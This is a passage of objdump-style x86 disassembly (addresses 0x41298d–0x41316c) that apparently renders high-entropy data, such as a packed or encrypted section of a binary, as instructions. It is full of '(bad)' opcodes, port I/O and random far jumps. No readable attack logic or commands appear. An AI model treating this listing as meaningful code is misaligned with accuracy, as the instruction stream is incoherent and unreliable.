  41298d:	aam    0x3c
  41298f:	fwait
  412990:	scas   al,BYTE PTR es:[edi]
  412991:	call   0xea1e:0x76b47436
  412998:	xchg   DWORD PTR [ebx+0x4c970294],esp
  41299e:	push   ecx
  41299f:	lds    esp,FWORD PTR [eax+0x4c449106]
  4129a5:	sub    DWORD PTR [eax],0x6
  4129a8:	mov    ds:0xc1646e1f,al
  4129ad:	push   DWORD PTR [edx]
  4129af:	jge    0x412947
  4129b1:	jge    0x41298d
  4129b3:	jp     0x41293e
  4129b5:	test   al,0x9f
  4129b7:	adc    al,0xa1
  4129b9:	rcr    DWORD PTR [edi-0x34],0x96
  4129bd:	xor    dh,ch
  4129bf:	add    al,0xeb
  4129c1:	ret    
  4129c2:	out    0xb6,al
  4129c4:	fisubr DWORD PTR [ebx+0x4e]
  4129c7:	and    DWORD PTR [ecx],0x5c2da202
  4129cd:	jg     0x4129bc
  4129cf:	pop    ecx
  4129d0:	jae    0x412a43
  4129d2:	pop    eax
  4129d3:	aad    0x17
  4129d5:	add    al,BYTE PTR [esi-0x4afdb6ab]
  4129db:	xchg   esp,eax
  4129dc:	pop    ds
  4129dd:	jg     0x412a30
  4129df:	dec    esi
  4129e0:	pop    ss
  4129e1:	and    eax,0x8fb12791
  4129e6:	ret    0x3feb
  4129e9:	pop    esi
  4129ea:	sbb    ebp,DWORD PTR [ecx+0xe]
  4129ed:	bound  edx,QWORD PTR [ecx-0x4765d921]
  4129f3:	call   0x3e67:0x1ffcafd6
  4129fa:	outs   dx,DWORD PTR ds:[esi]
  4129fb:	dec    ebx
  4129fc:	bound  ebp,QWORD PTR [ecx+0x4c]
  4129ff:	sti    
  412a00:	push   ecx
  412a01:	rol    edi,cl
  412a03:	xchg   edx,eax
  412a04:	jo     0x412a7d
  412a06:	xchg   BYTE PTR [edx-0x53b71fb9],bl
  412a0c:	outs   dx,BYTE PTR ds:[esi]
  412a0d:	sbb    BYTE PTR [ebx+0x5b5a3e6b],dh
  412a13:	int3   
  412a14:	inc    eax
  412a15:	pop    esi
  412a16:	lods   al,BYTE PTR ds:[esi]
  412a17:	out    dx,al
  412a18:	push   edx
  412a19:	lahf   
  412a1a:	(bad)  
  412a1b:	in     eax,0xe8
  412a1d:	sub    ebx,DWORD PTR [eax-0x10]
  412a20:	cs push edi
  412a22:	mov    ch,0x8a
  412a24:	lea    esp,[edx+edi*4+0x1a]
  412a28:	sub    BYTE PTR [edi],cl
  412a2a:	cdq    
  412a2b:	data16 or ch,BYTE PTR [edx-0x45eb61f8]
  412a32:	xor    dh,cl
  412a34:	aaa    
  412a35:	inc    ecx
  412a36:	xchg   ecx,eax
  412a37:	call   0x50bf857a
  412a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a3d:	inc    ebx
  412a3e:	pop    esp
  412a3f:	out    0x5f,eax
  412a41:	jbe    0x412a22
  412a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a44:	call   0x6e59b197
  412a49:	iret   
  412a4a:	loop   0x412a1f
  412a4c:	out    0x4a,al
  412a4e:	fst    st(4)
  412a50:	xor    DWORD PTR [edi-0xd9e9304],ecx
  412a56:	call   0x75bb:0x9a527b58
  412a5d:	fdivr  DWORD PTR [eax-0x7b0fde43]
  412a63:	bound  esi,QWORD PTR [edx-0x55]
  412a66:	mov    dh,0x17
  412a68:	and    esi,edi
  412a6a:	mov    eax,ds:0x4c668f9
  412a6f:	push   esp
  412a70:	dec    eax
  412a71:	mov    al,ds:0x6ff73fe8
  412a76:	(bad)  
  412a78:	icebp  
  412a79:	dec    edx
  412a7a:	int3   
  412a7b:	sbb    eax,0xc39df27c
  412a80:	mov    ebp,0x470d824
  412a85:	cmp    DWORD PTR [ebp-0x51],ebx
  412a88:	mov    dl,0x12
  412a8a:	inc    ebx
  412a8b:	mov    ch,0x1a
  412a8d:	cwde   
  412a8e:	mov    al,ds:0x618d403b
  412a93:	fistp  QWORD PTR [ebx+0x4f5ca9d3]
  412a99:	mov    al,ds:0x80f7e542
  412a9e:	nop
  412a9f:	dec    esp
  412aa0:	ds (bad) 
  412aa2:	leave  
  412aa3:	xchg   edi,eax
  412aa4:	daa    
  412aa5:	ret    0x6011
  412aa8:	sbb    eax,0xe245b4a1
  412aad:	out    0x60,al
  412aaf:	adc    ecx,DWORD PTR [esi]
  412ab1:	xchg   esp,eax
  412ab2:	test   ah,0x42
  412ab5:	dec    edx
  412ab6:	popa   
  412ab7:	jecxz  0x412b1f
  412ab9:	aaa    
  412aba:	sbb    ch,BYTE PTR [eax-0x13e47aec]
  412ac0:	mov    dl,BYTE PTR [esi+0x7b]
  412ac3:	mov    dh,0x7c
  412ac5:	jno    0x412aec
  412ac7:	inc    ebp
  412ac8:	(bad)  
  412ac9:	adc    DWORD PTR [edx+0x3d],esp
  412acc:	jecxz  0x412a95
  412ace:	adc    BYTE PTR [ebx+0x3800769b],bh
  412ad4:	xchg   DWORD PTR [edi+0x78c2a2ef],eax
  412ada:	mov    ebp,0xdf84d0d1
  412adf:	adc    al,0x7e
  412ae1:	jne    0x412b01
  412ae3:	or     al,BYTE PTR [esi-0x20]
  412ae6:	mov    WORD PTR [ecx],?
  412ae8:	xchg   ebx,eax
  412ae9:	ror    DWORD PTR [ebx+ecx*4-0x25a15501],0x4
  412af1:	jb     0x412abf
  412af3:	mov    edx,esp
  412af5:	xlat   BYTE PTR ds:[ebx]
  412af6:	(bad)  
  412af7:	jno    0x412b32
  412af9:	cmp    dl,BYTE PTR [edi-0x12eea7]
  412aff:	add    DWORD PTR [eax+0x4f],0xffffffdc
  412b03:	jbe    0x412ab1
  412b05:	inc    BYTE PTR [esi+0x3ee88307]
  412b0b:	mov    edi,0xce282205
  412b10:	mov    eax,ds:0xf239f2ee
  412b15:	pop    esp
  412b16:	mov    al,ds:0x5e1fa508
  412b1b:	pop    eax
  412b1c:	aas    
  412b1d:	test   al,0x12
  412b1f:	scas   al,BYTE PTR es:[edi]
  412b20:	fdivr  DWORD PTR [ebp+0x6b]
  412b23:	imul   BYTE PTR [edx+0x1be76512]
  412b29:	pop    ss
  412b2a:	shl    BYTE PTR [bp+di-0x4db3],cl
  412b2f:	inc    edx
  412b30:	add    BYTE PTR [ecx+0x38808a0f],dh
  412b36:	out    0x3d,al
  412b38:	cwde   
  412b39:	jnp    0x412b26
  412b3b:	jne    0x412b4d
  412b3d:	aam    0x23
  412b3f:	out    0xc5,eax
  412b41:	enter  0x9f3c,0xe7
  412b45:	rol    BYTE PTR [edi+0x57bd7157],cl
  412b4b:	sahf   
  412b4c:	jp     0x412b1f
  412b4e:	mov    esp,0x2e2401c8
  412b53:	fcmove st,st(1)
  412b55:	imul   edi,DWORD PTR [ecx-0x1420ed17],0x36
  412b5c:	stc    
  412b5d:	xor    eax,0x2c2639bd
  412b62:	inc    esi
  412b63:	out    dx,al
  412b64:	adc    al,0x3b
  412b66:	mov    fs:0xa6943958,eax
  412b6c:	xor    al,0x94
  412b6e:	inc    ebp
  412b6f:	push   ds
  412b70:	je     0x412bb7
  412b72:	xor    eax,0xfd1982d4
  412b77:	xor    al,0x29
  412b79:	push   ss
  412b7a:	or     edi,DWORD PTR [ecx+eax*8-0x44022f96]
  412b81:	call   0x3adb:0x545f74f8
  412b88:	pop    ss
  412b89:	mov    ds:0xd19d3793,eax
  412b8e:	inc    ecx
  412b8f:	mov    dh,0x12
  412b91:	xchg   esi,eax
  412b92:	loop   0x412bb3
  412b94:	adc    al,0x78
  412b96:	jae    0x412b5f
  412b98:	or     ebx,DWORD PTR [esi]
  412b9a:	push   cs
  412b9b:	popa   
  412b9c:	mov    ch,0xf9
  412b9e:	xlat   BYTE PTR ds:[ebx]
  412b9f:	cmc    
  412ba0:	inc    ebp
  412ba1:	sbb    bl,bh
  412ba3:	cld    
  412ba4:	leave  
  412ba5:	test   BYTE PTR [bx+si-0x683d],bh
  412baa:	jmp    0xf2df4fba
  412baf:	cwde   
  412bb0:	das    
  412bb1:	and    BYTE PTR [esi],al
  412bb3:	fwait
  412bb4:	test   DWORD PTR [eax-0x6fb1a15b],ebp
  412bba:	and    DWORD PTR [ebx-0x319f8084],ebx
  412bc0:	dec    edx
  412bc1:	lods   al,BYTE PTR ds:[esi]
  412bc2:	mov    ch,0xae
  412bc4:	cmp    bh,BYTE PTR [eax+0x52407802]
  412bca:	adc    cl,BYTE PTR [edi]
  412bcc:	inc    ebx
  412bcd:	(bad)  
  412bcf:	add    dl,dh
  412bd1:	xchg   DWORD PTR [esi-0x7de35192],ebp
  412bd7:	out    0xe6,eax
  412bd9:	bound  eax,QWORD PTR [edi-0x7]
  412bdc:	lods   al,BYTE PTR ds:[esi]
  412bdd:	sbb    al,cl
  412bdf:	cld    
  412be0:	pop    esi
  412be1:	push   ecx
  412be2:	and    BYTE PTR fs:[ebp-0x73],0xda
  412be7:	cmp    eax,0xe35a5e2d
  412bec:	call   0x616eda88
  412bf1:	mov    dh,0x0
  412bf3:	iret   
  412bf4:	test   BYTE PTR [eax],al
  412bf6:	xlat   BYTE PTR ds:[ebx]
  412bf7:	(bad)  
  412bf8:	xor    eax,0x38ef89c2
  412bfd:	(bad)
  412c01:	cli    
  412c02:	jg     0x412c83
  412c04:	dec    esp
  412c05:	add    ecx,DWORD PTR [esi]
  412c07:	pop    esi
  412c08:	cmc    
  412c09:	(bad)  
  412c0b:	and    bh,dh
  412c0d:	scas   al,BYTE PTR es:[edi]
  412c0e:	ins    BYTE PTR es:[edi],dx
  412c0f:	(bad)  
  412c10:	test   al,0xe4
  412c12:	sub    eax,0x2abeec17
  412c17:	cmp    ebp,edx
  412c19:	(bad)  
  412c1a:	leave  
  412c1b:	icebp  
  412c1c:	pop    ebp
  412c1d:	test   BYTE PTR [esi],bh
  412c1f:	xor    al,0x89
  412c21:	mov    al,ds:0x5fbacfa3
  412c26:	mov    dl,0xae
  412c28:	push   cs
  412c29:	cmp    cl,al
  412c2b:	push   ecx
  412c2c:	inc    ecx
  412c2d:	mov    ebx,0x289f6106
  412c32:	call   0x91c7:0xbce2c29b
  412c39:	add    al,0x47
  412c3b:	(bad)  [edi-0x67]
  412c3e:	retf   
  412c3f:	add    BYTE PTR ds:0xcdc2bfe4,dh
  412c45:	add    dh,0x12
  412c48:	out    0x8a,al
  412c4a:	bnd jl 0x412c89
  412c4d:	fisttp DWORD PTR [edx+0x1e88f0d3]
  412c53:	retf   0x5c98
  412c56:	data16 sub BYTE PTR [ebp-0x648cf767],dl
  412c5d:	dec    esp
  412c5e:	xchg   edx,eax
  412c5f:	fnstcw WORD PTR [ecx-0x64]
  412c62:	icebp  
  412c63:	mov    ebx,gs
  412c65:	sub    BYTE PTR [ebx+0x2b],bh
  412c68:	mov    eax,DWORD PTR [eax+0x56]
  412c6b:	loopne 0x412c0c
  412c6d:	push   edi
  412c6e:	imul   esi,ebx,0x708df15e
  412c74:	sar    DWORD PTR ss:[eax+0x701a2810],cl
  412c7b:	push   cs
  412c7c:	pop    ss
  412c7d:	movq   QWORD PTR [edx+ebx*4+0x28],mm2
  412c82:	cmp    edx,DWORD PTR [ecx-0x2b]
  412c85:	push   ecx
  412c86:	sbb    ah,al
  412c88:	or     al,BYTE PTR [edi]
  412c8a:	fist   WORD PTR [edx]
  412c8c:	loopne 0x412c3e
  412c8e:	scas   al,BYTE PTR es:[edi]
  412c8f:	int    0xfb
  412c91:	rcr    DWORD PTR [ebx-0x5221bf39],cl
  412c97:	stos   DWORD PTR es:[edi],eax
  412c98:	sbb    eax,0x965dbc26
  412c9d:	es push 0x4c
  412ca0:	ins    BYTE PTR es:[edi],dx
  412ca1:	cmp    eax,0x5041f2da
  412ca6:	iret   
  412ca7:	call   0xaac2:0xc9f01a27
  412cae:	jle    0x412cc7
  412cb0:	cdq    
  412cb1:	pop    ebp
  412cb2:	mov    ebx,0xd3c173f3
  412cb7:	adc    DWORD PTR [edi],esi
  412cb9:	fstp   QWORD PTR [edi-0x68]
  412cbc:	adc    esi,DWORD PTR [ecx+0x1bbc019e]
  412cc2:	jmp    0x412d40
  412cc4:	mov    eax,0x59f750ee
  412cc9:	sbb    eax,0x7d64b745
  412cce:	ins    DWORD PTR es:[edi],dx
  412ccf:	add    ch,cl
  412cd1:	add    DWORD PTR [esi],ebp
  412cd3:	outs   dx,DWORD PTR ds:[esi]
  412cd4:	mov    bh,0xe8
  412cd6:	scas   eax,DWORD PTR es:[edi]
  412cd7:	inc    edi
  412cd9:	mov    ebp,0x7710b165
  412cde:	pusha  
  412cdf:	fimul  WORD PTR [esi+eiz*8+0x6b]
  412ce3:	icebp  
  412ce4:	rep lods eax,DWORD PTR ds:[esi]
  412ce6:	sti    
  412ce7:	xchg   ebx,eax
  412ce9:	pop    ebx
  412cea:	push   ebp
  412ceb:	mov    WORD PTR [eax+ebx*1-0x355b2ddb],es
  412cf2:	mov    eax,0x4ee50729
  412cf7:	iret   
  412cf8:	sbb    eax,0x3d08e25d
  412cfd:	jle    0x412cf4
  412cff:	push   ds
  412d00:	out    0xbd,al
  412d02:	sbb    ch,BYTE PTR [edx-0x58]
  412d05:	mov    esi,0xdc5a76a
  412d0a:	mov    ebx,0xa37947e5
  412d0f:	adc    BYTE PTR [ecx-0x3e],0xa5
  412d13:	jns    0x412cee
  412d15:	dec    eax
  412d16:	mov    ds:0x593c17bb,eax
  412d1b:	out    dx,al
  412d1c:	out    0xbf,eax
  412d1e:	cmp    eax,0x7b6426c2
  412d23:	adc    cl,BYTE PTR [ebp+0x16]
  412d26:	inc    ebp
  412d27:	dec    edx
  412d28:	jmp    0x412cc7
  412d2a:	jae    0x412d5c
  412d2c:	mov    bl,0x67
  412d2e:	sti    
  412d2f:	sbb    BYTE PTR [ebx-0x67],ah
  412d32:	sti    
  412d33:	pop    esi
  412d34:	and    ebx,ebp
  412d36:	sub    edx,DWORD PTR [esi-0x59]
  412d39:	pop    ebx
  412d3a:	sti    
  412d3b:	in     al,dx
  412d3c:	test   BYTE PTR [eax+eax*4-0x31552080],bh
  412d43:	jb     0x412d95
  412d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d46:	pop    eax
  412d47:	or     edi,esi
  412d49:	mov    ebp,0xc0810c16
  412d4e:	dec    ecx
  412d4f:	fld    QWORD PTR [eax-0x6dbc799a]
  412d55:	push   ebx
  412d56:	js     0x412daa
  412d58:	xor    al,0x3e
  412d5a:	repz loopne 0x412cdd
  412d5d:	inc    edi
  412d5e:	lods   al,BYTE PTR ds:[esi]
  412d5f:	mov    bl,0x6b
  412d61:	sti    
  412d62:	pop    ebx
  412d63:	jnp    0x412d4f
  412d65:	dec    edi
  412d66:	in     eax,dx
  412d67:	cmp    ebx,DWORD PTR [ebp-0x70]
  412d6a:	cmp    BYTE PTR [edi+0xe],dl
  412d6d:	sti    
  412d6e:	sar    BYTE PTR [edi-0x80],1
  412d71:	mov    ecx,0x8b6fb5b8
  412d76:	xchg   DWORD PTR [esi],ebx
  412d78:	popa   
  412d79:	nop
  412d7a:	push   esi
  412d7b:	mov    eax,DWORD PTR [ecx+0x36]
  412d7e:	add    al,0x27
  412d80:	add    edi,ebx
  412d82:	sub    al,0x66
  412d84:	dec    edi
  412d85:	loope  0x412d90
  412d87:	sub    BYTE PTR [ecx],0x93
  412d8a:	jmp    0xa563:0x87ddc71b
  412d91:	mov    ds:0x929d3a96,eax
  412d96:	dec    ebp
  412d97:	ret    
  412d98:	fidiv  WORD PTR [edi+0x625b5931]
  412d9e:	sub    esp,DWORD PTR [ebx+edx*8]
  412da1:	pop    ebp
  412da2:	das    
  412da3:	fstp   TBYTE PTR [eax]
  412da5:	test   DWORD PTR [ebp-0x202eb0d5],esi
  412dab:	or     dh,ch
  412dad:	pusha  
  412dae:	inc    ebp
  412daf:	pop    edx
  412db0:	out    dx,eax
  412db1:	sbb    ch,0xb0
  412db4:	jne    0x412dea
  412db6:	mov    cl,0x8
  412db8:	sbb    bl,cl
  412dba:	push   edi
  412dbb:	jp     0x412dc8
  412dbd:	and    al,0x23
  412dbf:	adc    DWORD PTR [edx+ecx*4],esi
  412dc2:	pop    esp
  412dc3:	mov    eax,0x8349711b
  412dc8:	dec    ebp
  412dc9:	stc    
  412dca:	jne    0x412d52
  412dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dcd:	mov    ecx,0x8b1800c8
  412dd2:	retf   
  412dd3:	out    dx,eax
  412dd4:	push   esp
  412dd5:	mov    edx,0xd9d2561e
  412dda:	or     eax,0x438fdacf
  412ddf:	cwde   
  412de0:	push   ecx
  412de1:	inc    eax
  412de2:	mov    ebp,DWORD PTR [ecx]
  412de4:	mov    eax,ds:0xbea165d9
  412de9:	xor    DWORD PTR [eax-0x57e4fdde],edi
  412def:	std    
  412df0:	jo     0x412e14
  412df2:	(bad)  
  412df3:	xchg   esi,eax
  412df4:	jne    0x412dc6
  412df6:	mov    edx,ecx
  412df8:	sbb    eax,0xa31e9a89
  412dfd:	rol    DWORD PTR [ecx+0x2b57443e],1
  412e03:	mov    ds:0x58585859,eax
  412e08:	mov    eax,0x53028261
  412e0d:	pop    eax
  412e0e:	das    
  412e0f:	in     eax,0x30
  412e11:	mov    bh,0xf8
  412e13:	push   es
  412e14:	pop    eax
  412e15:	and    DWORD PTR [ecx+0x7f],ecx
  412e18:	mov    ax,0x4a0e
  412e1c:	xlat   BYTE PTR ds:[ebx]
  412e1d:	jno    0x412da7
  412e1f:	ret    
  412e20:	mov    bh,0x9d
  412e22:	sub    ah,dh
  412e24:	(bad)  
  412e25:	ds (bad) 
  412e28:	jg     0x412e66
  412e2a:	jmp    0xc9ca1474
  412e2f:	push   edi
  412e30:	jae    0x412e41
  412e32:	lea    edx,[edx-0x4b]
  412e35:	mov    bl,0x38
  412e37:	(bad)  
  412e38:	add    dl,BYTE PTR es:[eax-0x29eed328]
  412e3f:	and    al,0x5d
  412e41:	sbb    al,0x32
  412e43:	pop    ebx
  412e44:	mov    eax,ds:0x8902e54a
  412e49:	pushf  
  412e4a:	fcmove st,st(3)
  412e4c:	(bad)  
  412e4d:	mov    eax,ebp
  412e4f:	mov    ecx,0x5cf8d5ae
  412e54:	ror    edx,0xd9
  412e57:	mov    al,ds:0x76d7188e
  412e5c:	cmp    BYTE PTR [ebp-0x7d],dh
  412e5f:	fdivr  QWORD PTR [ebx+edx*8+0x7b]
  412e63:	nop
  412e64:	mul    BYTE PTR [ebx-0x2a66b959]
  412e6a:	clc    
  412e6b:	enter  0xe9c8,0xb
  412e6f:	fdivrp st(2),st
  412e71:	js     0x412ea1
  412e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e74:	rcl    BYTE PTR [ebx+0x3343dd3a],0x5a
  412e7b:	jg     0x412e81
  412e7d:	xor    eax,0x2b9e3e6a
  412e82:	or     BYTE PTR [ecx-0x395ceb37],cl
  412e88:	addr16 std 
  412e8a:	hlt    
  412e8b:	mov    ebx,0x6ce16893
  412e90:	adc    DWORD PTR cs:[edx+0x23c9e77f],eax
  412e97:	push   0xa4a3d442
  412e9c:	int    0xf3
  412e9e:	mov    bl,0x81
  412ea0:	shr    al,1
  412ea2:	pop    ds
  412ea3:	dec    eax
  412ea4:	test   al,0x5f
  412ea6:	mov    eax,fs:0x94ef4b6
  412eac:	cwde   
  412ead:	icebp  
  412eae:	mov    cl,0xed
  412eb0:	dec    esi
  412eb1:	popa   
  412eb2:	fs jne 0x412edc
  412eb5:	mov    esi,DWORD PTR [ebx+ebx*1]
  412eb8:	das    
  412eb9:	sub    eax,0xabd712b4
  412ebe:	shl    BYTE PTR [ebp-0x10],1
  412ec1:	inc    di
  412ec3:	xlat   BYTE PTR ds:[ebx]
  412ec4:	lea    esp,[ebx+0x4fd1c741]
  412eca:	xor    BYTE PTR [ecx-0x9bc3e8],al
  412ed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ed1:	push   ecx
  412ed2:	mov    eax,DWORD PTR [eax+0x643e2148]
  412ed8:	or     DWORD PTR [ebp+0x8],esp
  412edb:	jp     0x412ee0
  412edd:	mov    al,BYTE PTR [eax-0x1f]
  412ee0:	es into 
  412ee2:	scas   al,BYTE PTR es:[edi]
  412ee3:	xchg   ebp,eax
  412ee4:	ss out dx,al
  412ee6:	sbb    al,0xd2
  412ee8:	pop    eax
  412ee9:	sub    bh,BYTE PTR [ecx+0x370a156d]
  412eef:	ja     0x412ee0
  412ef1:	outs   dx,BYTE PTR ds:[esi]
  412ef2:	sbb    eax,DWORD PTR [ebp+0x2c6991c7]
  412ef8:	xchg   BYTE PTR [edi],ch
  412efa:	mov    ebx,0xf02b3b54
  412eff:	aas    
  412f00:	nop
  412f01:	ret    
  412f02:	pop    edx
  412f03:	cli    
  412f04:	pop    esi
  412f05:	or     eax,0x145f7ab6
  412f0a:	loopne 0x412f33
  412f0c:	jno    0x412f2c
  412f0e:	loop   0x412f3e
  412f10:	imul   ebp,DWORD PTR [esi+0x76670bbc],0x645ff858
  412f1a:	call   0x4fa12c05
  412f1f:	mov    ah,0xd0
  412f21:	sbb    esp,esp
  412f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f24:	test   DWORD PTR [esi-0xe],0x72d0aa47
  412f2b:	pop    esp
  412f2c:	xchg   edi,eax
  412f2d:	int    0x7b
  412f2f:	mov    edi,0xb7be1d70
  412f34:	addr16 shl bh,cl
  412f37:	dec    esp
  412f38:	sahf   
  412f39:	sbb    ebp,DWORD PTR [esi]
  412f3b:	mov    bl,0xc4
  412f3d:	retf   
  412f3e:	sbb    cl,bl
  412f40:	out    0x7b,al
  412f42:	mov    ecx,DWORD PTR [ebx-0x7eb6081b]
  412f48:	inc    edx
  412f49:	loopne 0x412efa
  412f4b:	and    eax,DWORD PTR [ebx-0x41]
  412f4e:	mov    esi,ecx
  412f50:	adc    dl,BYTE PTR [ebx]
  412f52:	sbb    al,0x46
  412f54:	mov    ch,0x61
  412f56:	ror    DWORD PTR [ecx+0x5a4eae3e],cl
  412f5c:	xchg   edi,eax
  412f5d:	cmp    ebx,0xffffffd2
  412f60:	inc    ebx
  412f61:	cmp    bl,BYTE PTR fs:[ecx]
  412f64:	inc    esi
  412f65:	(bad)  
  412f67:	mov    bh,0xa8
  412f69:	jae    0x412f5c
  412f6b:	pop    es
  412f6c:	jmp    0x9598:0xc8171aa5
  412f73:	imul   ebp,ebx,0xffffffbe
  412f76:	mov    BYTE PTR [ebx+0x55b814b5],dh
  412f7c:	fst    QWORD PTR [ebp+0x2ec5ad8]
  412f82:	jmp    0x1319:0xe0eab023
  412f89:	mov    dl,0x96
  412f8b:	jl     0x412fcb
  412f8d:	test   al,0x27
  412f8f:	or     eax,0xf29685d5
  412f94:	stos   DWORD PTR es:[edi],eax
  412f95:	mov    bh,0xb5
  412f97:	add    cl,BYTE PTR [ebp-0x1fef8faf]
  412f9d:	fadd   QWORD PTR ds:[ecx+0x2512565a]
  412fa4:	js     0x412f30
  412fa6:	sbb    DWORD PTR [ebx],eax
  412fa8:	pop    edi
  412fa9:	push   ebx
  412faa:	into   
  412fab:	jp     0x412ff3
  412fad:	je     0x412ff3
  412faf:	jb     0x412fed
  412fb1:	cmp    BYTE PTR [esi],0x65
  412fb4:	cmc    
  412fb5:	arpl   WORD PTR [eax+0x51],si
  412fb8:	dec    edx
  412fb9:	jle    0x412fc3
  412fbb:	push   0x92d52d52
  412fc0:	out    0xe,al
  412fc2:	pusha  
  412fc3:	(bad)
  412fc6:	mov    ds:0xbc1da433,eax
  412fcb:	push   es
  412fcc:	mov    ?,ecx
  412fce:	sub    dh,ch
  412fd0:	and    al,BYTE PTR [edi]
  412fd2:	dec    ebx
  412fd3:	xchg   ecx,eax
  412fd4:	jecxz  0x413011
  412fd6:	(bad)  
  412fd7:	loope  0x412f77
  412fd9:	out    0xb0,eax
  412fdb:	retf   0xf28a
  412fde:	out    dx,eax
  412fdf:	xchg   ecx,eax
  412fe0:	fcos   
  412fe2:	jp     0x41301a
  412fe4:	ss jno 0x412fe5
  412fe7:	ret    0xc8b9
  412fea:	xchg   edi,eax
  412feb:	xchg   ebx,eax
  412fec:	dec    ebx
  412fed:	aad    0x83
  412fef:	sbb    edx,DWORD PTR [ebx-0x58]
  412ff2:	sbb    ah,ah
  412ff4:	shl    DWORD PTR [edx+0x3f751c93],cl
  412ffa:	sub    BYTE PTR [ecx+0x2066168b],dl
  413000:	cvtpi2ps xmm7,QWORD PTR [esi+0xebb29e4]
  413007:	adc    DWORD PTR [edx],eax
  413009:	in     al,0x12
  41300b:	or     ebp,DWORD PTR [esp+ecx*1+0x59ab8c7d]
  413012:	sub    DWORD PTR [edx+ecx*1-0x16],esp
  413016:	icebp  
  413017:	jle    0x413094
  413019:	mov    al,0x3e
  41301b:	mov    ds,WORD PTR [edx+0x0]
  41301e:	sub    al,0x4e
  413020:	mov    WORD PTR [ecx-0x6d104808],ds
  413026:	mov    bh,0xd5
  413028:	xchg   BYTE PTR [eax],cl
  41302a:	add    eax,0x4897a7f8
  41302f:	inc    edi
  413030:	pop    ebp
  413031:	xchg   esp,eax
  413032:	pop    edx
  413033:	clc    
  413034:	jle    0x412fd8
  413036:	in     eax,dx
  413037:	adc    eax,DWORD PTR [esi-0x5a1cd3c]
  41303d:	push   ecx
  41303e:	inc    ebp
  41303f:	xor    ebx,DWORD PTR [esi-0x5c]
  413042:	adc    WORD PTR [esi+0x4e],di
  413046:	jnp    0x412fdc
  413048:	pop    ecx
  413049:	push   esi
  41304a:	add    BYTE PTR ds:0x487861f3,0x57
  413051:	mov    cl,0xd
  413053:	xchg   esi,eax
  413054:	daa    
  413055:	inc    edx
  413056:	shr    BYTE PTR [edi-0x342b7639],cl
  41305c:	xchg   ecx,eax
  41305d:	xlat   BYTE PTR ds:[ebx]
  41305e:	adc    dl,BYTE PTR [eax+0x5a]
  413061:	ror    DWORD PTR [ebp-0x4f],1
  413064:	push   esp
  413065:	xchg   ebp,eax
  413066:	lds    edx,FWORD PTR [ebx+0x337b37e3]
  41306c:	in     eax,0x39
  41306e:	jp     0x41308b
  413070:	push   es
  413071:	mov    esp,0xc737e63b
  413076:	rcl    BYTE PTR [ebx],1
  413078:	(bad)  
  413079:	sub    bp,WORD PTR ds:0x5175afd3
  413080:	pop    es
  413081:	or     al,0xd9
  413083:	inc    edx
  413084:	pushf  
  413085:	test   DWORD PTR [ebp-0x51462744],edx
  41308b:	aaa    
  41308c:	or     eax,0xe219c1e2
  413091:	add    DWORD PTR [esp+ebp*1-0x3858cfe8],0xec9f9857
  41309c:	cmp    al,0xa2
  41309e:	retf   
  41309f:	mov    dh,0x29
  4130a1:	pop    esp
  4130a2:	dec    BYTE PTR [esi]
  4130a4:	lods   al,BYTE PTR ds:[esi]
  4130a5:	hlt    
  4130a6:	pop    edi
  4130a7:	sbb    DWORD PTR [edx],edi
  4130a9:	jo     0x41308e
  4130ab:	or     bh,dl
  4130ad:	enter  0x7411,0xc6
  4130b1:	push   esi
  4130b2:	xor    DWORD PTR [ecx],esi
  4130b4:	mov    dl,0x4d
  4130b6:	ret    0xa8a2
  4130b9:	das    
  4130ba:	in     eax,dx
  4130bb:	jmp    0x3db701e1
  4130c0:	pop    es
  4130c1:	jmp    FWORD PTR [edx+eax*1+0x19]
  4130c5:	pop    ds
  4130c6:	or     bl,bl
  4130c8:	sbb    BYTE PTR [esi+0x27],ch
  4130cb:	pop    ebp
  4130cc:	repz fs add al,0x60
  4130d0:	loope  0x41311a
  4130d2:	jmp    0x28a83efb
  4130d7:	aam    0x9e
  4130d9:	sbb    ch,ch
  4130db:	adc    esi,DWORD PTR [ecx+0x7]
  4130de:	arpl   si,sp
  4130e0:	pusha  
  4130e1:	lods   eax,DWORD PTR ds:[esi]
  4130e2:	mov    ecx,0x49f4e54d
  4130e7:	mov    edx,0x340f8e6
  4130ec:	ds sub al,0xa4
  4130ef:	jnp    0x41308c
  4130f1:	shld   DWORD PTR [eax+edx*8],edx,cl
  4130f5:	pop    ds
  4130f6:	cmp    BYTE PTR [edx+0x17],ah
  4130f9:	scas   al,BYTE PTR es:[edi]
  4130fa:	mov    esi,0x26783839
  4130ff:	mov    ebx,0xff484384
  413104:	mov    bl,0x33
  413106:	inc    ecx
  413107:	repz inc edx
  413109:	and    DWORD PTR [esi+0x35],ebx
  41310c:	inc    esi
  41310d:	jmp    0x413119
  41310f:	fild   DWORD PTR [edi-0x6b]
  413112:	sbb    bl,BYTE PTR [edi]
  413114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413115:	cmc    
  413116:	push   0xe85d6c23
  41311b:	pop    ecx
  41311c:	inc    ecx
  41311d:	mov    cl,0xa4
  41311f:	outs   dx,DWORD PTR ds:[esi]
  413120:	gs adc al,0xd0
  413123:	jb     0x413137
  413125:	mov    edi,0x31947b99
  41312a:	pop    esp
  41312b:	and    eax,0xb78e5628
  413130:	jb     0x4130de
  413132:	jae    0x41319b
  413134:	mov    bl,0x7f
  413136:	xor    ah,BYTE PTR [esi+eax*8-0x67379a7]
  41313d:	dec    ecx
  41313e:	inc    esi
  41313f:	idiv   BYTE PTR [esi]
  413141:	push   esi
  413142:	iret   
  413143:	or     bh,BYTE PTR ss:[esi+0x29]
  413147:	cmp    dh,ch
  413149:	inc    ebp
  41314a:	xor    ch,BYTE PTR [ebx-0x3]
  41314d:	test   ebp,edi
  41314f:	sbb    BYTE PTR [ebp+0x3],bl
  413152:	dec    esi
  413153:	scas   al,BYTE PTR es:[edi]
  413154:	in     eax,dx
  413155:	push   es
  413156:	mov    eax,ds:0x8aec5b85
  41315b:	push   0xba1b68d6
  413160:	xor    DWORD PTR [esi-0x11],ecx
  413163:	jmp    0x20304e74
  413168:	test   al,0xd1
  41316a:	xor    BYTE PTR [esi],al
  41316c:	aas    
